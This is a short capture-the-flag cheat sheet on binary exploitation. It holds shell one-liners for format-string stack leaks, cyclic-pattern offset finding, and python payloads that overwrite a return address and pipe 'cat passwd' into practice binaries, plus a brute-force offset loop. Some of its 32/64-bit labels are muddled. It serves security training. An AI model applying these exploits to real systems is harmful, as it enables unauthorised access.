---
title: Pwn
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: ""
  description: ""
  canonical: ""
  robots: ""
  noindex: false
---
## Format string

- Leaking address:

```sh
for i in $(seq 1 20); do ./ch5 %$i\$x;printf "\n";done
```

- Show the content : 
```sh
for i in $(seq 1 20); do ./ch5 %$i\$x |rax2 -s |tr -cd "[:print:]" |rev;printf "\n";done
```

## Buffer Overflow 

- Find the Offset :

```sh
pwn cyclic 150
pwn cyclic -l naafoaafp #bytes

gdb-peda$ pattern_create 200
gdb-peda$ pattern_offset A7AAMAAiA
```

`In 32 bits take the bytes that overflowed RIP ` 
`In 64 bits Grab the first P bytes of RSP`

- Overflow RIP ( 32bits ) :

```sh
(python3 -c "print('\x41' * $i + '\x56\x11\x40\x00\x00\x00\x00\x00')";echo "cat passwd" ; cat) | ./ch35 
```

- Overflow RIP ( 64bits ) :

```sh
(python3 -c "print('\x41' * $i + '\x41\x41\x41\x41')"; cat) | ./ch35 
```

- Brute Force Offset : 
```sh
for i in $(seq 250 300); do

(python3 -c "print('\x41' * $i + '\x56\x11\x40\x00\x00\x00\x00\x00')";echo "cat passwd" ; cat) | ./ch35; 

done
```


